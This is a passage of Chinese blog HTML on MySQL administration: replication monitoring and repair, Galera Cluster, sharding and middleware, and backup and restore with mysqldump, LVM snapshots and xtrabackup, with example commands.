RESET SLAVE <span class="token punctuation">[</span><span class="token keyword">ALL</span><span class="token punctuation">]</span></code></pre>

<h4 id="监控主从复制"><a href="#监控主从复制" class="headerlink" title="监控主从复制"></a>监控主从复制</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> MASTER <span class="token keyword">STATUS</span>
<span class="token keyword">SHOW</span> <span class="token keyword">BINARY</span> LOGS
<span class="token keyword">SHOW</span> BINLOG EVENTS
<span class="token keyword">SHOW</span> SLAVE <span class="token keyword">STATUS</span>
<span class="token keyword">SHOW</span> PROCESSLIST</code></pre>

<h4 id="从服务器是否落后于主服务"><a href="#从服务器是否落后于主服务" class="headerlink" title="从服务器是否落后于主服务"></a>从服务器是否落后于主服务</h4><p><code>show slave status</code>命令显示的信息中有一项数据是：Seconds_Behind_Master，它可以反映主从复制的延迟，当然实际中只靠这一个参数是不够的，其他的后面再研究</p>
<h4 id="如何确定从节点数据是否一致"><a href="#如何确定从节点数据是否一致" class="headerlink" title="如何确定从节点数据是否一致"></a>如何确定从节点数据是否一致</h4><p>使用 percona-toolkit 工具，具体如何使用自行百度</p>
<h4 id="数据不一致如何修复"><a href="#数据不一致如何修复" class="headerlink" title="数据不一致如何修复"></a>数据不一致如何修复</h4><p>删掉从数据库，重新复制</p>
<h3 id="主从复制的问题和解决方案"><a href="#主从复制的问题和解决方案" class="headerlink" title="主从复制的问题和解决方案"></a>主从复制的问题和解决方案</h3><h4 id="数据损坏或丢失"><a href="#数据损坏或丢失" class="headerlink" title="数据损坏或丢失"></a>数据损坏或丢失</h4><ul>
<li>主节点：MHA + 半同步复制</li>
<li>从节点：删掉从数据库，重新复制</li>
</ul>
<h4 id="不惟一的-server-id"><a href="#不惟一的-server-id" class="headerlink" title="不惟一的 server id"></a>不惟一的 server id</h4><p>重新复制</p>
<h4 id="复制延迟"><a href="#复制延迟" class="headerlink" title="复制延迟"></a>复制延迟</h4><ul>
<li>需要额外的监控工具的辅助</li>
<li>一从多主：mariadb10 版后支持</li>
<li>多线程复制：对多个数据库复制</li>
</ul>
<h4 id="MySQL-主从数据不一致"><a href="#MySQL-主从数据不一致" class="headerlink" title="MySQL 主从数据不一致"></a>MySQL 主从数据不一致</h4><p>造成主从不一致的原因：</p>
<ul>
<li>主库 binlog 格式为 Statement，同步到从库执行后可能造成主从不一致。</li>
<li>主库执行更改前有执行 set sql_log_bin&#x3D;0，会使主库不记录 binlog，从库也无法变更这部分数据。</li>
<li>从节点未设置只读，误操作写入数据</li>
<li>主库或从库意外宕机，宕机可能会造成 binlog 或者 relaylog 文件出现损坏，导致主从不一致</li>
<li>主从实例版本不一致，特别是高版本是主，低版本为从的情况下，主数据库上面支持的功能，从数据库上面可能不支持该功能</li>
<li>MySQL 自身 bug 导致</li>
</ul>
<p>主从不一致修复方法：</p>
<ul>
<li><p>将从库重新实现<br>虽然这也是一种解决方法，但是这个方案恢复时间比较慢，而且有时候从库也是承担一部分的查询操作的，不能贸然重建。</p>
</li>
<li><p>使用 percona-toolkit 工具辅助<br>PT 工具包中包含 pt-table-checksum 和 pt-table-sync 两个工具，主要用于检测主从是否一致以及修复数据不一致情况。这种方案优点是修复速度快，不需要停止主从辅助，缺点是需要知识积累，需要时间去学习，去测试，特别是在生产环境，还是要小心使用</p>
<p>关于使用方法，可以参考下面链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/feiren/p/7777218.html">https://www.cnblogs.com/feiren/p/7777218.html</a></p>
</li>
<li><p>手动重建不一致的表<br>在从库发现某几张表与主库数据不一致，而这几张表数据量也比较大，手工比对数据不现实，并且重做整个库也比较慢，这个时候可以只重做这几张表来修复主从不一致这种方案缺点是在执行导入期间需要暂时停止从库复制，不过也是可以接受的<br>范例：A,B,C 这三张表主从数据不一致</p>
</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、从库停止Slave复制
mysql<span class="token operator">></span>stop slave<span class="token punctuation">;</span>

<span class="token number">2</span>、在主库上dump这三张表，并记录下同步的binlog和POS点
mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-pmagedu</span> <span class="token parameter variable">-q</span> --single-transaction --master-data<span class="token operator">=</span><span class="token number">2</span> testdb A B C <span class="token operator">></span>/backup/A_B_C.sql
<span class="token number">3</span>、查看A_B_C.sql文件，找出记录的binlog和POS点
<span class="token function">head</span> A_B_C.sql
例如:MASTERLOGFILE<span class="token operator">=</span><span class="token string">'mysql-bin.888888'</span>, <span class="token assign-left variable">MASTERLOGPOS</span><span class="token operator">=</span><span class="token number">666666</span><span class="token punctuation">;</span>

<span class="token comment">#以下指令是为了保障其他表的数据不丢失，一直同步直到那个点结束，A,B,C表的数据在之前的备份已</span>
经生成了一份快照，只需要导入进入，然后开启同步即可
<span class="token number">4</span>、把A_B_C.sql拷贝到Slave机器上，并做指向新位置
mysql<span class="token operator">></span>start slave <span class="token keyword">until</span> <span class="token assign-left variable">MASTERLOGFILE</span><span class="token operator">=</span><span class="token string">'mysql-bin.888888'</span>,
<span class="token assign-left variable">MASTERLOGPOS</span><span class="token operator">=</span><span class="token number">666666</span><span class="token punctuation">;</span>

<span class="token number">5</span>、在Slave机器上导入A_B_C.sql
mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-pmagedu</span> testdb
mysql<span class="token operator">></span>set <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
mysql<span class="token operator">></span>source /backup/A_B_C.sql
mysql<span class="token operator">></span>set <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>

<span class="token number">6</span>、导入完毕后，从库开启同步即可。
mysql<span class="token operator">></span>start slave<span class="token punctuation">;</span></code></pre>

<p>如何避免主从不一致：</p>
<ul>
<li>主库 binlog 采用 ROW 格式</li>
<li>主从实例数据库版本保持一致</li>
<li>主库做好账号权限把控，不可以执行 set sql_log_bin&#x3D;0</li>
<li>从库开启只读，不允许人为写入</li>
<li>定期进行主从一致性检验</li>
</ul>
<h2 id="Galera-Cluster"><a href="#Galera-Cluster" class="headerlink" title="Galera Cluster"></a>Galera Cluster</h2><p>Galera Cluster：集成了 Galera 插件的 MySQL 集群，是一种新型的，数据不共享的，高度冗余的高可用方案，目前 Galera Cluster 有两个版本，分别是 Percona Xtradb Cluster（PXC）及 MariaDB Cluster，Galera 本身是具有多主特性的，即采用 multi-master 的集群架构，是一个既稳健，又在数据一致性、完整性及高性能方面有出色表现的高可用解决方案</p>
<p><strong>Galera Cluster 特点：</strong>多主架构、同步复制、并发复制、故障切换、热拔插、自动节点克隆、对应用透明</p>
<p><strong>Galera Cluster 缺点：</strong></p>
<ul>
<li>性能由集群中最差的节点决定</li>
<li>新节点加入后，需全量拷贝，作为 donor（贡献者）的节点在同步过程中无法提供读写</li>
<li>只支持 innodb 存储引擎的表</li>
</ul>
<p><strong>Galera Cluster 工作过程：</strong></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603684087099.png"></p>
<h2 id="MySQL-中间件代理服务器"><a href="#MySQL-中间件代理服务器" class="headerlink" title="MySQL 中间件代理服务器"></a>MySQL 中间件代理服务器</h2><h3 id="数据切分"><a href="#数据切分" class="headerlink" title="数据切分"></a><a target="_blank" rel="noopener" href="https://www.imooc.com/article/288363">数据切分</a></h3><p>数据切分按照切分类型分为 垂直切分 和 水平切分</p>
<p><strong>垂直切分</strong>是按照业务的分类将表分散到不同的库，这样也就将数据或者说压力分散到不同的库上面</p>
<p>优点：</p>
<ul>
<li>拆分后业务清晰，拆分规则明确</li>
<li>系统之间整合或扩展容易</li>
<li>数据维护简单</li>
</ul>
<p>缺点：</p>
<ul>
<li>部分业务表无法 join，只能通过接口方式解决，提高了系统的复杂度</li>
<li>事务处理复杂</li>
<li>有些业务表会过于庞大，存在单库性能瓶颈</li>
</ul>
<p><strong>水平切分</strong>按照某个字段的某种规则，把数据切分到多张数据表。一张数据表化整为零，拆分成多张数据表</p>
<p>优点：</p>
<ul>
<li>拆分规则抽象好，join 操作基本可以数据库做</li>
<li>不存在单库大数据，高并发的性能瓶颈</li>
<li>应用端改造较少</li>
<li>提高了系统的稳定性跟负载能力</li>
</ul>
<p>缺点：</p>
<ul>
<li>拆分规则难以抽象</li>
<li>分片事务一致性难以解决</li>
<li>数据多次扩展难度跟维护量极大</li>
<li>跨库 join 性能较差</li>
</ul>
<p>前面讲了垂直切分跟水平切分的不同跟优缺点，会发现每种切分方式都有缺点，但共同特点缺点有：</p>
<ul>
<li>引入分布式事务的问题</li>
<li>跨节点 Join 的问题</li>
<li>跨节点合并排序分页问题</li>
<li>多数据源管理问题</li>
</ul>
<p>由于数据切分后，join 有难度，所以：</p>
<ol>
<li>尽量不要使用 join，或者直接禁止使用 join，单独查询然后使用编程语言自行处理</li>
<li>可以适当增加冗余字段</li>
</ol>
<p><font color=red>注意：</font>水平切分和垂直切分有前后顺序：先水平切分，再垂直切分：</p>
<blockquote>
<p>随着数据量的增加，最先应该做的是数据分片，利用多块硬盘来增大数据 IO 能力和存储空间，这么做的成本是最低的。几块硬盘的钱就能收获不错的 IO 性能。</p>
<p>进入到下一个阶段，数据量继续增大，这时候我们应该把数据切分到多个 MySQL 节点上，用 MyCat 管理数据切分。当然还要做数据的读写分离等等，这里不展开讨论。在后台做水平切分的同时，业务系统也可以引入负载均衡、分布式架构等等。理论上，使用了冷热数据分离之后，水平切分这种方式可以继续维持很长一段时间，数据量再大也不怕，定期归档就好了。</p>
<p>数据库到了水平切分的阶段，数据量的增加已经不是更改架构设计的主要原因了。反而这个阶段业务系统承受不住了，如果再不对系统做模块拆分，业务系统也撑不下去了，所以按照模块和业务，把一个系统拆分成若干子系统。若干子系统之间，数据相对独立。比如淘宝不会跟支付支付宝分享全部数据，共享同一套数据表，这也影响各自业务的发展。所以就要弄垂直切分了，把数据表归类，拆分成若干个数据库系统。</p>
<p>讲到这里，你仔细想想。如果过早的对数据库做了垂直切分，势必要重新构建若干独立的业务系统，工作量太巨大。水平切分并不需要业务系统做大幅度的修改，因此说应该先从水平切分开始做。</p>
<p>作者：神思者<br>链接：<a target="_blank" rel="noopener" href="http://www.imooc.com/article/288363">http://www.imooc.com/article/288363</a><br>来源：慕课网<br>本文原创发布于慕课网 ，转载请注明出处，谢谢合作</p>
</blockquote>
<h3 id="MySQL-中间件"><a href="#MySQL-中间件" class="headerlink" title="MySQL 中间件"></a>MySQL 中间件</h3><p>数据切分后，需要使用中间件进行数据管理</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603598581511.png"></p>
<p>MySQL 中间件分为两类：</p>
<ul>
<li><p>负载均衡：Haproxy、MySQL-Proxy</p>
</li>
<li><p>数据切分：MyCAT、Atlas、OneProxy、ProxySQL</p>
<p>最常用的是 MyCAT 和 ProxySQL ，前者功能丰富，社区活跃，中文文档、后者性能更好，推荐使用 MyCAT</p>
</li>
</ul>
<h4 id="MyCAT"><a href="#MyCAT" class="headerlink" title="MyCAT"></a>MyCAT</h4><p>MyCAT 的官方文档写的很好，值得好好看一遍</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603695796885.png"></p>
<h4 id="ProxySQL"><a href="#ProxySQL" class="headerlink" title="ProxySQL"></a>ProxySQL</h4><p>略…</p>
<h2 id="MySQL-高可用"><a href="#MySQL-高可用" class="headerlink" title="MySQL 高可用"></a>MySQL 高可用</h2><p>MHA + 半同步复制</p>
<p>PXC</p>
<p>TiDB</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D/" class="post-title-link" itemprop="url">MySQL备份和恢复</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-31 23:10:46" itemprop="dateCreated datePublished" datetime="2020-12-31T23:10:46+08:00">2020-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="备份类型"><a href="#备份类型" class="headerlink" title="备份类型"></a>备份类型</h3><ul>
<li><p>完全备份、部分备份、<strong>增量备份</strong>、<strong>差异备份</strong></p>
<ul>
<li>完全备份：整个数据集</li>
<li>部分备份：只备份数据子集，如部分库或表</li>
<li>增量备份：仅备份最近一次完全备份或者增量备份（如果有增量备份）以来变化的数据，备份较快，还原复杂</li>
<li>差异备份：仅备份最近一次完全备份以来变化的数据，备份较慢，还原简单</li>
</ul>
<p>注意：二进制日志文件不应该与数据文件放在同一磁盘</p>
</li>
<li><p>冷备份、温备份、热备份</p>
<ul>
<li>冷备：读写操作均不可进行，数据库停止服务</li>
<li>温备：读操作可执行，但写操作不可执行</li>
<li>热备：读写操作均可执行</li>
</ul>
<pre class="language-none"><code class="language-none">MyISAM：支持温备，不支持热备

InnoDB：都支持</code></pre>
</li>
<li><p>物理备份、逻辑备份</p>
<ul>
<li>物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快</li>
<li>逻辑备份：从数据库中“到处”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度</li>
</ul>
</li>
</ul>
<p><strong>增量备份</strong> 图示：</p>
<p><img data-src="//img.to2b.cn/blog/lujinkai/1664185564106.png" alt="增量备份"></p>
<p><strong>差异备份</strong> 图示：</p>
<p><img data-src="//img.to2b.cn/blog/lujinkai/1664185621779.png" alt="差异备份"></p>
<p>推荐：<strong>增量备份 + 热备 + 物理备份</strong></p>
<h3 id="备份什么"><a href="#备份什么" class="headerlink" title="备份什么"></a>备份什么</h3><ul>
<li>数据</li>
<li>二进制日志、InnoDB 的事务日志</li>
<li>用户帐号，权限设置，程序代码（存储过程、函数、触发器、事件调度器）</li>
<li>服务器的配置文件</li>
</ul>
<h3 id="备份注意要点"><a href="#备份注意要点" class="headerlink" title="备份注意要点"></a>备份注意要点</h3><ul>
<li>能容忍最多丢失多少数据</li>
<li>备份产生的负载</li>
<li>备份过程的时长</li>
<li>温备的持锁多久</li>
<li>恢复数据需要在多长时间内完成</li>
<li>需要备份和恢复哪些数据</li>
</ul>
<h3 id="还原要点"><a href="#还原要点" class="headerlink" title="还原要点"></a>还原要点</h3><ul>
<li><strong>做还原测试，用于测试备份的可用性</strong></li>
<li>还原演练，写成规范的技术文档</li>
</ul>
<h3 id="备份工具"><a href="#备份工具" class="headerlink" title="备份工具"></a>备份工具</h3><ul>
<li>cp, ta r 等复制归档工具：物理备份工具，适用所有存储引擎；只支持冷备份</li>
<li>LVM 的快照：先加读锁，做快照后解锁，几乎热备；借助文件系统工具进行备份</li>
<li>mysqldump：逻辑备份工具，适用所有存储引擎，对 MyISAM 存储引擎进行温备；支持完全或部分备份；对 InnoDB 存储引擎支持热备，结合 binlog 的增量备份</li>
<li>xtrabackup：由 Percona 提供支持对 InnoDB 做热备(物理备份)的工具，支持完全备份、增量备份</li>
<li>MariaDB Backup： 从 MariaDB 10.1.26 开始集成，基于 Percona XtraBackup 2.3.8 实现</li>
<li>mysqlbackup：热备份， MySQL Enterprise Edition 组件</li>
<li>mysqlhotcopy：PERL 语言实现，几乎冷备，仅适用于 MyISAM 存储引擎，使用 LOCK TABLES、</li>
<li>FLUSH TABLES 和 cp 或 scp 来快速备份数据库</li>
</ul>
<h3 id="基于-LVM-的快照备份"><a href="#基于-LVM-的快照备份" class="headerlink" title="基于 LVM 的快照备份"></a>基于 LVM 的快照备份</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1 请求锁定所有表</span>
mysql<span class="token operator">></span> FLUSH TABLES WITH READ LOCK<span class="token punctuation">;</span>
<span class="token comment"># 2 记录二进制日志文件及事件位置</span>
mysql<span class="token operator">></span> FLUSH LOGS<span class="token punctuation">;</span>
mysql<span class="token operator">></span> SHOW MASTER STATUS<span class="token punctuation">;</span>
mysql <span class="token parameter variable">-e</span> <span class="token string">'SHOW MASTER STATUS'</span> <span class="token operator">></span> /<span class="token environment constant">PATH</span>/TO/SOMEFILE
<span class="token comment"># 3 创建快照</span>
lvcreate <span class="token parameter variable">-L</span> <span class="token comment"># -s -p r -n NAME /DEV/VG_NAME/LV_NAME</span>
<span class="token comment"># 4 释放锁</span>
mysql<span class="token operator">></span> UNLOCK TABLES<span class="token punctuation">;</span>
<span class="token comment"># 5 挂载快照卷，执行数据备份</span>
<span class="token comment"># 6 备份完成后，删除快照卷</span>
<span class="token comment"># 7 制定好策略，通过原卷备份二进制日志</span></code></pre>

<h3 id="冷备份和还原"><a href="#冷备份和还原" class="headerlink" title="冷备份和还原"></a>冷备份和还原</h3><p>冷备份和还原需要停止数据库服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1 关闭数据库</span>
<span class="token comment"># 2 `scp -r` 或 `rsync -av` 导出数据和二进制日志文件</span>
<span class="token comment"># 3 启动数据库</span>
<span class="token comment"># 4 发送故障，关闭数据库</span>
<span class="token comment"># 5 `scp -r` 或 `rsync -av`还原数据</span>
<span class="token comment"># 6 对需要权限的文件执行 `chown -R mysql:mysql`</span>
<span class="token comment"># 7 启动数据库</span></code></pre>

<h2 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h2><p>mysqldump 是逻辑备份工具，是 MySQL 的客户端工具，通过 mysql 协议连接至 mysql 服务器进行备份</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 支持指定数据库和指定多表的备份，默认创建数据库语句不备份，创建表语句备份</span>
mysqldump <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> database <span class="token punctuation">[</span>tables<span class="token punctuation">]</span>
<span class="token comment"># 支持指定数据库备份，创建数据库语句也会备份</span>
mysqldump <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token parameter variable">-B</span> DB1 <span class="token punctuation">[</span>DB2 DB3<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token comment"># 备份所有数据库，创建数据库语句也会备份</span>
mysqldump <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span></code></pre>

<p>常见选项：</p>
<ul>
<li><p>-A：备份所有数据库，包含 create database 语句</p>
<ul>
<li>-A 包括 mysql 数据库，但不包括 information_schema 和 performance_schema</li>
</ul>
</li>
<li><p>-B db_name…：备份指定的数据库，包含 create database 语句</p>
</li>
<li><p>–flush-privileges：-A 包含了 mysql 数据库，其中包含了权限的数据库，需要加上–flush-privileges，将来恢复的时候权限才会生效</p>
</li>
<li><p>-n：不备份 create database 语句，会被-A 或-B 覆盖</p>
</li>
<li><p>-t：只备份数据，不备份表结构，即不备份 create table 语句</p>
</li>
<li><p>-d：只备份表结构，不备份数据，即只备份 create table 语句</p>
</li>
<li><p>-E：备份相关的所有 event scheduler</p>
</li>
<li><p>-R：备份所有存储过程和自定义函数</p>
</li>
<li><p>–triggers：备份表相关触发器，默认启用，用 –skip-triggers 不备份触发器</p>
</li>
<li><p>–default-character-set&#x3D;utf8mb4：指定字符集</p>
</li>
<li><p>–single-transaction：置事务的隔离级别为可重复读，即 REPEATABLE READ，这样能保证在一个事务中所有相同的查询读取到同样的数据，也就大概保证了在 dump 期间，如果其他 innodb 引擎的线程修改了表的数据并提交，对该 dump 线程的数据并无影响，在这期间不会锁表</p>
</li>
<li><p>–master-data&#x3D;1|2</p>
<p>此选项会自动关闭–lock-tables 功能，自动打开-x | –lock-all-tables 功能（除非开启–single-transaction）</p>
<ul>
<li>1：默认值，所备份的数据之前加一条记录为 CHANGE MASTER TO 语句，适合于主从复制多机使用</li>
<li>2：所备份的数据之前加一条记录为 CHANGE MASTER TO 语句，但是被注释，适合于单机使用</li>
</ul>
</li>
<li><p>-F：在 dump 之前会执行<code>--flush-logs</code>刷新日志。使用-A 或-B 时一次性 dump 多个库，每个库都会刷新一次。建议搭配–master-data 或–lock-all-tables，就只会刷新一次</p>
</li>
<li><p>–compact：去掉注释，节约备份占用的空间，适合调试，生产不使用</p>
</li>
<li><p>-f：忽略 SQL 错误，继续执行</p>
</li>
<li><p>–hex-blob：使用十六进制符号转储二进制列，当有包括 BINARY， VARBINARY，BLOB，BIT 的数据类型的列时使用，避免乱码</p>
</li>
<li><p>-q：不缓存查询，直接输出，加快备份速度</p>
</li>
</ul>
<h3 id="mysqldump-备份的最佳姿势"><a href="#mysqldump-备份的最佳姿势" class="headerlink" title="mysqldump 备份的最佳姿势"></a>mysqldump 备份的最佳姿势</h3><h4 id="Innodb"><a href="#Innodb" class="headerlink" title="Innodb"></a>Innodb</h4><pre class="language-bash" data-language="bash"><code class="language-bash">mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-A</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-F</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-E</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-R</span> <span class="token punctuation">\</span>
<span class="token parameter variable">--triggers</span> <span class="token punctuation">\</span>
--single-transaction <span class="token punctuation">\</span>
--master-data<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>
--flush-privileges <span class="token punctuation">\</span>
--default-character-set<span class="token operator">=</span>utf8mb4 <span class="token punctuation">\</span>
--hex-blob <span class="token punctuation">\</span>
<span class="token operator">></span> <span class="token variable">$&#123;BACKUP&#125;</span>/fullbak_<span class="token variable">$&#123;BACKUP_TIME&#125;</span>.sql</code></pre>

<h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><pre class="language-bash" data-language="bash"><code class="language-bash">mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-A</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-F</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-E</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-R</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-x</span> <span class="token punctuation">\</span>
--master-data<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>
--flush-privileges <span class="token punctuation">\</span>
<span class="token parameter variable">--triggers</span> <span class="token punctuation">\</span>
--default-character-set<span class="token operator">=</span>utf8mb4 <span class="token punctuation">\</span>
--hex-blob <span class="token punctuation">\</span>
<span class="token operator">></span> <span class="token variable">$&#123;BACKUP&#125;</span>/fullbak_<span class="token variable">$&#123;BACKUP_TIME&#125;</span>.sql</code></pre>

<h3 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h3><ul>
<li>mysqldump 结合二进制日志文件实现增量备份</li>
</ul>
<p>数据库接手的时候，早期的二进制日志文件已经没有了，此时可以先用 msyqldump 做全量备份，然后再定期备份二进制日志文件</p>
<ul>
<li>恢复误删除的表</li>
</ul>
<p>每天都全量备份，误删数据表，该如何恢复？</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1 关闭数据库服务</span>
<span class="token comment"># 2 从完全备份(allbackup_2019-11-27_10:20:08.sql)中，找到二进制日志位置</span>
<span class="token comment"># 3 备份完全备份后的二进制日志(inc.sql)</span>
<span class="token comment"># 4 找到误删除的语句，从二进制日志备份中删除此语句</span>
<span class="token comment"># 5 关闭端口或者其他方式，禁止用户访问数据库</span>
<span class="token comment"># 6 启动数据库</span>
<span class="token comment"># 7 开始恢复数据</span>
    <span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysql -uroot -p</span>
    MariaDB <span class="token punctuation">[</span>hellodb<span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    MariaDB <span class="token punctuation">[</span>hellodb<span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">source</span> /backup/allbackup_2019-11-27_10:20:08.sql<span class="token punctuation">;</span>
    MariaDB <span class="token punctuation">[</span>hellodb<span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">source</span> /backup/inc.sql
    MariaDB <span class="token punctuation">[</span>hellodb<span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment"># 7 打开端口或者其他方式，恢复正常服务</span></code></pre>

<h2 id="xtrabackup"><a href="#xtrabackup" class="headerlink" title="xtrabackup"></a>xtrabackup</h2><p>xtrabackup 是一个开源的 mysql 数据库备份工具，支持 InnoD 和 XtraDB 引擎</p>
<p>mysqldump 基于逻辑备份，备份和还原比较慢，增量备份（配合二进制日志）需要自己写脚本</p>
<p>xtrabackup 基于物理备份，备份和还原很快，自动化增量备份</p>
<p>mysqldump 的优点是相较于 xtrabackup，备份文件更小，节省磁盘空间</p>
<p>当数据量比较大的时候，推荐使用 xtrabackup 备份</p>
<p><strong>xtrabackup 特点：</strong></p>
<ul>
<li>备份还原过程快速、可靠</li>
<li>备份过程不会打断正在执行的事务</li>
<li>能够基于压缩等功能节约磁盘空间和流量</li>
<li>自动实现备份检验</li>
<li>开源，免费</li>
</ul>
<p><strong>xtrabackup 备份过程：</strong></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603366208141.png"></p>
<p><strong>安装：</strong></p>
<p>xtrabackup2.4 支持 mysql5.7，xtrabackup8.0 支持 mysql8.0，这里以 2.4 版本为例，2.4 版本和 8.0 差不多，和旧版本有不少出入</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 去官网下载最新的版本，然后安装</span>
<span class="token punctuation">[</span>root@c71 src<span class="token punctuation">]</span><span class="token comment"># yum -y install ./percona-xtrabackup-24-2.4.20-1.el7.x86_64.rpm</span>
<span class="token punctuation">[</span>root@c72 src<span class="token punctuation">]</span><span class="token variable">$rpm</span> <span class="token parameter variable">-qi</span> percona-xtrabackup-24-2.4.20-1.el7
Name        <span class="token builtin class-name">:</span> percona-xtrabackup-24
Version     <span class="token builtin class-name">:</span> <span class="token number">2.4</span>.20
Release     <span class="token builtin class-name">:</span> <span class="token number">1</span>.el7
Architecture: x86_64
Install Date: Fri <span class="token number">23</span> Oct <span class="token number">2020</span> 09:40:03 AM CST
Group       <span class="token builtin class-name">:</span> Applications/Databases
Size        <span class="token builtin class-name">:</span> <span class="token number">33240760</span>
License     <span class="token builtin class-name">:</span> GPLv2
Signature   <span class="token builtin class-name">:</span> RSA/SHA256, Tue <span class="token number">21</span> Apr <span class="token number">2020</span> 04:45:08 AM CST, Key ID 9334a25f8507efa5
Source RPM  <span class="token builtin class-name">:</span> percona-xtrabackup-24-2.4.20-1.el7.src.rpm
Build Date  <span class="token builtin class-name">:</span> Tue <span class="token number">21</span> Apr <span class="token number">2020</span> 04:44:27 AM CST
Build Host  <span class="token builtin class-name">:</span> minimal-centos-7-x64-623.ci.percona.com
Relocations <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>not relocatable<span class="token punctuation">)</span>
URL         <span class="token builtin class-name">:</span> http://www.percona.com/software/percona-xtrabackup
Summary     <span class="token builtin class-name">:</span> XtraBackup online backup <span class="token keyword">for</span> MySQL / InnoDB
Description <span class="token builtin class-name">:</span>
Percona XtraBackup is OpenSource online <span class="token punctuation">(</span>non-blockable<span class="token punctuation">)</span> backup solution <span class="token keyword">for</span> InnoDB and XtraDB engines
